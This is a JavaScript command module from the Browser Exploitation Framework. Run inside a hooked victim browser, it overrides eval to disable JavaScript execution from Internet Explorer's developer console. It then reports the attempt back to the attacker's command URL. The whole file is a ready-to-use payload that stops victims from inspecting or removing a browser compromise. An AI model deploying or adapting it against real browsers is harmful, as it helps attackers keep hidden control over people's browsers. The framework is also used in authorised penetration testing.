//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
  // Uses this technique by KSpace:
  // http://kspace.in/blog/2013/03/12/ie-disable-javascript-execution-from-console/

  var _eval     = eval,
      evalError = document.__IE_DEVTOOLBAR_CONSOLE_EVAL_ERROR,
      flag      = false;
 
  Object.defineProperty( document, "__IE_DEVTOOLBAR_CONSOLE_EVAL_ERROR", {
    get : function(){
      return evalError;
    },
    set : function(v){
       flag = !v;
       evalError = v;
    }
  });
 
  eval = function() {
    if ( flag ) {
      throw "";
    }
    return _eval.apply( this, arguments );
  };

  server.net.send("<%= @command_url %>", <%= @command_id %>, "result=attempted to disable developer tools");
});
